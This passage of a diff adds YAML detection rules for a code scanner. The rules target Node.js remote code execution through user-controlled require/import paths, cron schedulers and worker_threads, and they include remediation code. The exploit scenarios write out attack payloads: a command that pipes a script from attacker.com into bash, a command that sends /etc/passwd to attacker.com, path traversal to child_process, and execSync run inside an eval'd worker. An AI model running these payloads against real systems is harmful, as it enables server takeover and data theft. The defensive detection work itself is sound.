+        pattern: 'global\s*\[\s*(?:req\.|ctx\.|[`\x27"]require[`\x27"])\s*\]\s*\(\s*(?:req\.|ctx\.|path|module|input|name)'
+        description: "Global bracket notation access to require with user input"
+    anti_patterns:
+      - 'require\s*\(\s*[`\x27"][a-zA-Z@][a-zA-Z0-9@/._-]+[`\x27"]\s*\)'
+      - 'import\s*\(\s*[`\x27"][a-zA-Z@][a-zA-Z0-9@/._-]+[`\x27"]\s*\)'
+      - 'require\s*\(\s*[`\x27"]\.\/'
+      - 'require\s*\(\s*[`\x27"]\.\.\/'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\('
+      - 'jest\.requireActual\s*\('
+      - 'proxyquire\s*\('
+      - 'require\.resolve\s*\('
+      - 'require\.cache'
+      - 'require\.main'
+      - 'import\.meta\.'
+      - '(?:webpack|rollup|parcel|esbuild).*require'
+      - 'dynamic.*import.*(?:chunk|split|lazy)'
+    bypass_variants:
+      - description: "Path traversal to reach sensitive modules"
+        pattern: 'require\s*\(\s*[`\x27"](?:\.\./)+[`\x27"]\s*\+\s*(?:req\.|input|name)'
+      - description: "Null byte injection to truncate path (older Node)"
+        pattern: 'require\s*\(\s*(?:name|input|module)\s*\+\s*[`\x27"](?:\\0|%00)'
+      - description: "Unicode normalization bypass for path filtering"
+        pattern: 'require\s*\(\s*(?:name|input).*?(?:normalize|replace|trim)'
+      - description: "Global module resolution bypass"
+        pattern: 'require\s*\(\s*(?:name|input)[\s\S]{0,100}(?:NODE_PATH|resolve\.paths)'
+    evasion_indicators:
+      - "Path traversal sequences (../) to escape intended directory"
+      - "Null byte injection for path truncation"
+      - "Module name encoding to bypass allowlists"
+      - "NODE_PATH manipulation for global module resolution"
+      - "Symlink following to reach restricted modules"
+    encoding_variants:
+      - type: "path_traversal"
+        pattern: 'require\s*\(.*?(?:\.\./|\.\.\\\\){2,}'
+      - type: "url_encoding"
+        pattern: 'require\s*\(.*?%(?:2[eE]){2}%(?:2[fF]|5[cC])'
+      - type: "unicode_normalization"
+        pattern: 'require\s*\(.*?(?:\\u002[eE]|\\u002[fF])'
+    multi_function_chain_patterns:
+      - "req.query.plugin -> require(pluginPath) -> plugin.execute()"
+      - "req.body.module -> path.join(__dirname, module) -> require(modulePath)"
+      - "user input -> dynamic import(moduleName) -> module.default()"
+      - "req.params.handler -> require('./handlers/' + handler) -> handler(req, res)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Dynamic module loading can execute arbitrary code via native modules or .js files"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.query.plugin"
+        sink: "require(`./plugins/${plugin}`)"
+        through: "template literal path construction"
+      - source: "req.body.handler"
+        sink: "require(path.join(__dirname, 'handlers', handler))"
+        through: "path.join with user-controlled component"
+      - source: "req.params.module"
+        sink: "import(`./modules/${module}`)"
+        through: "dynamic import with user-controlled path"
+    impact: |
+      - Arbitrary code execution via loading malicious or dangerous modules.
+      - File system traversal to load modules outside intended directory.
+      - Loading of child_process, fs, or net modules for system access.
+      - Native addon loading for native code execution.
+      - Information disclosure via module side effects.
+    remediation: |
+      1. Use an allowlist of permitted modules:
+         ```javascript
+         const ALLOWED_PLUGINS = new Set(['markdown', 'csv', 'json', 'xml']);
+
+         function loadPlugin(pluginName) {
+           // Validate against allowlist
+           if (!ALLOWED_PLUGINS.has(pluginName)) {
+             throw new Error(`Plugin ${pluginName} not allowed`);
+           }
+
+           // Use a fixed base path and prevent traversal
+           const safePath = path.join(__dirname, 'plugins', pluginName);
+           const realPath = fs.realpathSync(safePath);
+           const pluginsDir = fs.realpathSync(path.join(__dirname, 'plugins'));
+
+           if (!realPath.startsWith(pluginsDir)) {
+             throw new Error('Path traversal detected');
+           }
+
+           return require(realPath);
+         }
+         ```
+      2. Never use user input directly in require() or import() paths.
+      3. Validate resolved paths are within an expected directory.
+      4. Use fs.realpathSync() to resolve symlinks before validation.
+      5. Consider using a plugin manifest/registry instead of dynamic loading.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://nodejs.org/api/modules.html"
+      - "https://nodejs.org/api/esm.html#import-expressions"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'app\.(get|post)\s*\('
+        - 'router\.\w+\s*\('
+        - 'async\s+function'
+        - 'exports\.\w+\s*='
+      taint_source_indicators:
+        - 'req\.query\.(?:plugin|module|handler|name|type)'
+        - 'req\.body\.(?:plugin|module|handler|name)'
+        - 'req\.params\.(?:plugin|module|handler)'
+        - 'ctx\.request\.body'
+      taint_sink_indicators:
+        - 'require\s*\('
+        - 'import\s*\('
+        - 'require\.resolve\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_PLUGINS'
+        - 'ALLOWED_MODULES'
+        - 'allowedPlugins\.has\s*\('
+        - 'realpathSync\s*\('
+        - 'startsWith\s*\(\s*pluginsDir'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + path_traversal_risk)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A plugin system loads handlers dynamically:
+
+        app.get('/api/process/:handler', (req, res) => {
+          const handler = require(`./handlers/${req.params.handler}`);
+          const result = handler.process(req.body);
+          res.json(result);
+        });
+
+        Attacker sends:
+        GET /api/process/../../../../../../etc/passwd
+
+        Or loads a dangerous module:
+        GET /api/process/../../../node_modules/child_process
+      example_payload: "../../../node_modules/child_process"
+      attacker_objective: "Load arbitrary modules to achieve code execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-001"
+        - "RCE-JS-002"
+        - "RCE-JS-003"
+
+  # --------------------------------------------------------------------------
+  # RCE-JS-005: node-cron with user-controlled expression
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-005"
+    title: "node-cron / Scheduler with User-Controlled Expression or Command"
+    description: >
+      Detects usage of cron job schedulers (node-cron, cron, bull, agenda,
+      node-schedule) where the cron expression, job name, or executed
+      command/callback is derived from user-controlled input. Attackers can
+      manipulate cron expressions to schedule arbitrary task execution,
+      inject commands into job callbacks, or create denial-of-service
+      conditions through invalid or resource-intensive schedules.
+    language: javascript
+    category: rce
+    severity: High
+    confidence: 0.85
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - cron
+      - scheduler
+      - command-injection
+      - nodejs
+      - task-scheduling
+      - job-queue
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'cron\s*\.\s*schedule\s*\(\s*(?:req\.|ctx\.|body\.|cronExpr|expression|schedule|interval|userInput)'
+        description: "node-cron schedule with user-controlled expression"
+      - type: regex
+        pattern: 'new\s+CronJob\s*\(\s*(?:req\.|ctx\.|body\.|cronExpr|expression|schedule|interval|userInput)'
+        description: "CronJob constructor with user-controlled expression"
+      - type: regex
+        pattern: 'schedule\s*\.\s*scheduleJob\s*\(\s*(?:req\.|ctx\.|body\.|cronExpr|expression|schedule|rule|userInput)'
+        description: "node-schedule with user-controlled expression"
+      - type: regex
+        pattern: '(?:bull|agenda|bee-queue)\s*[\s\S]{0,300}\.(?:process|define|add|create|enqueue)\s*\(\s*(?:req\.|ctx\.|body\.|jobName|taskName|userInput)'
+        description: "Job queue with user-controlled job definition"
+      - type: regex
+        pattern: 'cron\s*\.\s*schedule\s*\([^,]+,\s*(?:\(\s*\)\s*=>\s*\{|function\s*\(\s*\)\s*\{)[\s\S]{0,300}(?:exec|execSync|eval|spawn|child_process)'
+        description: "Cron job callback containing shell execution"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w*(?:cron|schedule|interval|job)\w*\s*=\s*(?:req\.|ctx\.)(?:body|query|params)[\s\S]{0,300}(?:cron\.schedule|scheduleJob|CronJob)'
+        description: "Schedule variable from request used in cron setup"
+      - type: regex
+        pattern: '(?:agenda|bull|kue)\s*\.\s*(?:define|process|every|schedule)\s*\(\s*(?:req\.body|ctx\.request\.body|data)\s*[\.\[]'
+        description: "Job scheduler with user-controlled job parameters"
+      - type: regex
+        pattern: 'setInterval\s*\(\s*(?:\(\s*\)\s*=>\s*\{|function\s*\(\s*\)\s*\{)[\s\S]{0,200}(?:exec|eval|require)[\s\S]{0,100},\s*(?:req\.|interval|delay|ms|period)'
+        description: "setInterval with user-controlled interval and dangerous callback"
+    anti_patterns:
+      - 'cron\s*\.\s*schedule\s*\(\s*[`\x27"]\s*(?:\*\s+){4}\*\s*[`\x27"]'
+      - 'cron\s*\.\s*schedule\s*\(\s*[`\x27"]\d+\s+\*'
+      - 'new\s+CronJob\s*\(\s*[`\x27"][\d\s\*/,\-]+[`\x27"]'
+      - 'schedule\s*\.\s*scheduleJob\s*\(\s*[`\x27"][\d\s\*/,\-]+[`\x27"]'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\('
+      - '@Test'
+      - 'sinon\.\w+'
+      - 'process\.env\.CRON'
+      - 'config\.cron'
+      - 'CRON_EXPRESSION\s*='
+      - 'schedule:\s*process\.env'
+      - 'agenda\.every\s*\(\s*[`\x27"]\d+\s+(?:minute|hour|day)'
+    bypass_variants:
+      - description: "Cron expression DOS (every-second schedule)"
+        pattern: 'cron\s*\.\s*schedule\s*\(\s*[`\x27"]\*\s+\*\s+\*\s+\*\s+\*\s+\*[`\x27"]'
+      - description: "Job callback injection via user-controlled function body"
+        pattern: '(?:agenda|bull)\s*\.\s*(?:define|process)\s*\([^,]+,\s*new\s+Function\s*\('
+      - description: "Schedule manipulation for timing attacks"
+        pattern: 'cron\s*\.\s*schedule\s*\(\s*(?:req\.|body\.)[\s\S]{0,100}(?:exec|spawn|eval)\s*\('
+    evasion_indicators:
+      - "Cron expression manipulation for arbitrary timing"
+      - "Job callback containing shell execution"
+      - "Named job injection to override existing jobs"
+      - "Delayed execution to evade immediate detection"
+      - "Resource exhaustion via frequent scheduling"
+    encoding_variants:
+      - type: "cron_expression"
+        pattern: 'cron\.\w+\s*\(.*?(?:\*/1|0/1|\* \* \* \* \* \*)'
+      - type: "base64_callback"
+        pattern: '(?:cron|schedule|agenda)\.\w+\s*\(.*?(?:atob|Buffer\.from)\s*\('
+      - type: "eval_in_callback"
+        pattern: '(?:cron|schedule)\.\w+\s*\([^,]+,\s*(?:\(\)|function)[\s\S]{0,50}eval\s*\('
+    multi_function_chain_patterns:
+      - "req.body.schedule -> cron.schedule(schedule, callback) -> exec in callback"
+      - "req.body -> agenda.every(interval, jobName, data) -> job contains command"
+      - "user input -> bull.add(jobData) -> job processor executes command"
+      - "req.body.cron -> scheduleJob(cron, handler) -> handler uses user data"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Scheduled task execution enables persistent backdoor and timed attacks"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.schedule"
+        sink: "cron.schedule(schedule, callback)"
+        through: "request body to cron expression"
+      - source: "req.body.jobData"
+        sink: "queue.add(jobData)"
+        through: "request body to job queue"
+      - source: "req.body.interval"
+        sink: "agenda.every(interval, 'jobName')"
+        through: "request body to task interval"
+    impact: |
+      - Scheduled arbitrary code execution on the server.
+      - Persistent backdoor via recurring cron jobs.
+      - Denial of service through resource-intensive schedules.
+      - Delayed attack execution to evade immediate detection.
+      - Command injection via job callback manipulation.
+    remediation: |
+      1. Validate cron expressions and use an allowlist of permitted schedules:
+         ```javascript
+         const ALLOWED_SCHEDULES = {
+           'hourly': '0 * * * *',
+           'daily': '0 0 * * *',
+           'weekly': '0 0 * * 0',
+           'monthly': '0 0 1 * *'
+         };
+
+         function safeSchedule(userSchedule, callback) {
+           const cronExpr = ALLOWED_SCHEDULES[userSchedule];
+           if (!cronExpr) {
+             throw new Error('Schedule not allowed');
+           }
+           return cron.schedule(cronExpr, callback);
+         }
+         ```
+      2. Never allow user-controlled code in job callbacks.
+      3. Validate cron expression syntax before scheduling.
+      4. Limit the frequency of allowed schedules.
+      5. Implement job count limits per user.
+    references:
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://www.npmjs.com/package/node-cron"
+      - "https://www.npmjs.com/package/node-schedule"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\(\s*[`\x27"](?:node-cron|cron|node-schedule|bull|agenda)[`\x27"]\s*\)'
+        - 'import\s+.*from\s+[`\x27"](?:node-cron|cron|node-schedule)[`\x27"]'
+        - 'app\.(post|put)\s*\('
+        - 'router\.post\s*\('
+      taint_source_indicators:
+        - 'req\.body\.(?:schedule|cron|interval|expression|job)'
+        - 'req\.query\.(?:schedule|cron|interval)'
+        - 'ctx\.request\.body\.(?:schedule|cron)'
+      taint_sink_indicators:
+        - 'cron\.schedule\s*\('
+        - 'new\s+CronJob\s*\('
+        - 'schedule\.scheduleJob\s*\('
+        - 'agenda\.every\s*\('
+        - 'queue\.add\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_SCHEDULES'
+        - 'validateCron\s*\('
+        - 'cron-validator'
+        - 'isValidCron\s*\('
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (1 + persistence_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An admin panel allows scheduling automated reports:
+
+        app.post('/api/schedule-report', (req, res) => {
+          const { schedule, command } = req.body;
+          cron.schedule(schedule, () => {
+            exec(command); // User controls both schedule and command!
+          });
+          res.json({ status: 'scheduled' });
+        });
+
+        Attacker sends:
+        POST /api/schedule-report
+        Body: {"schedule": "* * * * *", "command": "curl http://attacker.com/shell.sh | bash"}
+
+        This creates a persistent backdoor that runs every minute.
+      example_payload: "* * * * * curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)"
+      attacker_objective: "Schedule persistent arbitrary command execution"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-001"
+        - "RCE-JS-002"
+
+  # --------------------------------------------------------------------------
+  # RCE-JS-006: worker_threads with user-controlled code
+  # --------------------------------------------------------------------------
+  - rule_id: "RCE-JS-006"
+    title: "worker_threads with User-Controlled Code/Path"
+    description: >
+      Detects usage of Node.js worker_threads module where the worker script
+      path, workerData, or eval'd code is derived from user-controlled input.
+      Workers execute JavaScript in separate threads with their own V8 instance
+      but share the same process and full Node.js API access. Providing user-
+      controlled code to a Worker enables arbitrary code execution in a
+      separate thread.
+    language: javascript
+    category: rce
+    severity: High
+    confidence: 0.87
+    cwe: CWE-94
+    owasp: "A03:2021-Injection"
+    tags:
+      - rce
+      - worker-threads
+      - code-injection
+      - nodejs
+      - multithreading
+      - parallel-execution
+      - worker
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'new\s+Worker\s*\(\s*(?:req\.|ctx\.|body\.|scriptPath|workerPath|filePath|userInput|data\.|input)'
+        description: "Worker constructor with user-controlled script path"
+      - type: regex
+        pattern: 'new\s+Worker\s*\(\s*[`\x27"].*?\$\{(?:req\.|ctx\.|path|script|input|user|data)'
+        description: "Worker with template literal containing user input in path"
+      - type: regex
+        pattern: 'new\s+Worker\s*\(\s*(?:req\.|ctx\.|code|script|userInput|input)[^,]*,\s*\{\s*eval\s*:\s*true'
+        description: "Worker with eval:true and user-controlled code string"
+      - type: regex
+        pattern: 'new\s+Worker\s*\([^)]*workerData\s*:\s*(?:req\.|ctx\.|body\.|userInput|data\.)'
+        description: "Worker with user-controlled workerData"
+      - type: regex
+        pattern: 'new\s+Worker\s*\(\s*(?:path\.join|path\.resolve)\s*\([^)]*(?:req\.|ctx\.|input|user|data|name)'
+        description: "Worker with path.join/resolve containing user input"
+      - type: regex
+        pattern: '(?:const|let|var)\s+\w*(?:code|script|worker)\w*\s*=\s*(?:req\.|ctx\.)(?:body|query|params)[\s\S]{0,200}new\s+Worker'
+        description: "Code from request used in Worker construction"
+      - type: regex
+        pattern: 'new\s+Worker\s*\(\s*`[^`]*require\s*\\([^)]*\\)[^`]*`\s*,\s*\{[^}]*eval\s*:\s*true'
+        description: "Worker with eval:true executing code containing require"
+      - type: regex
+        pattern: 'parentPort\s*\.\s*on\s*\(\s*[`\x27"]message[`\x27"]\s*,[\s\S]{0,200}(?:eval|exec|Function|require)\s*\('
+        description: "Worker message handler with dangerous code execution"
+    anti_patterns:
+      - 'new\s+Worker\s*\(\s*[`\x27"]\./\w+\.js[`\x27"]'
+      - 'new\s+Worker\s*\(\s*[`\x27"]\./__\w+[`\x27"]'
+      - 'new\s+Worker\s*\(\s*path\.join\s*\(\s*__dirname\s*,\s*[`\x27"]\w+\.js[`\x27"]\s*\)'
+      - 'new\s+Worker\s*\(\s*require\.resolve\s*\('
+      - 'new\s+Worker\s*\(\s*new\s+URL\s*\(\s*[`\x27"]\.\/'
+      - 'describe\s*\(\s*[`\x27"]'
+      - 'it\s*\(\s*[`\x27"]'
+      - 'jest\.mock\s*\('
+      - '@jest'
+      - 'sinon\.\w+'
+      - 'isMainThread\s*\?\s*'
+      - 'Worker\s*\.\s*terminate\s*\('
+      - 'piscina'
+      - 'workerpool'
+      - 'jest-worker'
+    bypass_variants:
+      - description: "eval:true with user-controlled code string"
+        pattern: 'new\s+Worker\s*\(\s*(?:code|script|input)\s*,\s*\{[^}]*eval\s*:\s*true'
+      - description: "Path traversal in worker script path"
+        pattern: 'new\s+Worker\s*\(\s*[`\x27"](?:\.\./)+[`\x27"]\s*\+\s*(?:req\.|input|name)'
+      - description: "workerData containing executable code"
+        pattern: 'workerData\s*:\s*\{[^}]*(?:code|script|exec|command)\s*:\s*(?:req\.|input)'
+      - description: "SharedArrayBuffer-based code injection"
+        pattern: 'new\s+SharedArrayBuffer[\s\S]{0,200}new\s+Worker'
+    evasion_indicators:
+      - "eval:true flag enabling code string execution"
+      - "Path traversal in worker script path"
+      - "workerData containing commands or code"
+      - "SharedArrayBuffer for cross-thread data injection"
+      - "MessagePort for command relay"
+    encoding_variants:
+      - type: "base64_code"
+        pattern: 'new\s+Worker\s*\(\s*(?:atob|Buffer\.from)\s*\('
+      - type: "path_traversal"
+        pattern: 'new\s+Worker\s*\(.*?(?:\.\./|\.\.\\\\){2,}'
+      - type: "escaped_code"
+        pattern: 'new\s+Worker\s*\(.*?\\x[0-9A-Fa-f]{2}'
+    multi_function_chain_patterns:
+      - "req.body.code -> new Worker(code, {eval: true}) -> code execution in thread"
+      - "req.body.script -> path.join(__dirname, script) -> new Worker(path)"
+      - "req.body -> workerData -> Worker message -> eval in worker"
+      - "user input -> Worker construction -> parentPort communication -> exec"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Worker threads have full Node.js API access for OS-level operations"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "req.body.code"
+        sink: "new Worker(code, {eval: true})"
+        through: "user code string to Worker with eval mode"
+      - source: "req.body.scriptPath"
+        sink: "new Worker(scriptPath)"
+        through: "user-controlled worker script path"
+      - source: "req.body.workerData"
+        sink: "new Worker(script, {workerData: userWorkerData})"
+        through: "user data passed to worker thread"
+    impact: |
+      - Arbitrary code execution in a separate thread with full Node.js access.
+      - Access to file system, network, and child_process from worker thread.
+      - Resource exhaustion via spawning many worker threads.
+      - Persistent code execution in background threads.
+      - Full server compromise via worker with require() access.
+    remediation: |
+      1. Never use user input as Worker script path or code:
+         ```javascript
+         const { Worker } = require('worker_threads');
+         const path = require('path');
+
+         const ALLOWED_WORKERS = new Map([
+           ['resize', path.join(__dirname, 'workers/resize.js')],
+           ['convert', path.join(__dirname, 'workers/convert.js')],
+           ['compress', path.join(__dirname, 'workers/compress.js')]
+         ]);
+
+         function safeCreateWorker(workerType, data) {
+           const workerPath = ALLOWED_WORKERS.get(workerType);
+           if (!workerPath) {
+             throw new Error(`Worker type ${workerType} not allowed`);
+           }
+
+           // Validate and sanitize workerData
+           const safeData = sanitizeWorkerData(data);
+
+           return new Worker(workerPath, {
+             workerData: safeData
+           });
+         }
+         ```
+      2. Never use eval:true with user-controlled code.
+      3. Use a fixed set of worker scripts with an allowlist.
+      4. Validate and sanitize all workerData passed to workers.
+      5. Limit the number of concurrent workers per request.
+    references:
+      - "https://nodejs.org/api/worker_threads.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://cwe.mitre.org/data/definitions/94.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'require\s*\(\s*[`\x27"]worker_threads[`\x27"]\s*\)'
+        - 'import\s+.*from\s+[`\x27"]worker_threads[`\x27"]'
+        - 'isMainThread'
+        - 'parentPort'
+        - 'app\.(post|put)\s*\('
+      taint_source_indicators:
+        - 'req\.body\.(?:code|script|worker|task|path)'
+        - 'req\.query\.(?:type|worker|handler)'
+        - 'ctx\.request\.body'
+        - 'event\.body'
+      taint_sink_indicators:
+        - 'new\s+Worker\s*\('
+        - 'workerData\s*:'
+        - 'parentPort\.postMessage\s*\('
+      sanitization_patterns:
+        - 'ALLOWED_WORKERS'
+        - 'workerAllowlist'
+        - 'validateWorkerType\s*\('
+        - 'sanitizeWorkerData\s*\('
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + thread_access_factor)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A code execution service uses workers for isolation:
+
+        app.post('/api/run', (req, res) => {
+          const worker = new Worker(req.body.code, { eval: true });
+          worker.on('message', (result) => res.json({ result }));
+          worker.on('error', (err) => res.status(500).json({ error: err.message }));
+        });
+
+        Attacker sends:
+        POST /api/run
+        Body: {"code": "const {parentPort} = require('worker_threads'); const cp = require('child_process'); parentPort.postMessage(cp.execSync('id').toString())"}
+
+        The worker executes OS commands and returns results via message port.
+      example_payload: "const {parentPort} = require('worker_threads'); parentPort.postMessage(require('child_process').execSync('whoami').toString())"
+      attacker_objective: "Execute arbitrary code via worker thread with full Node.js access"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "RCE-JS-001"
+        - "RCE-JS-002"
+        - "RCE-JS-003"
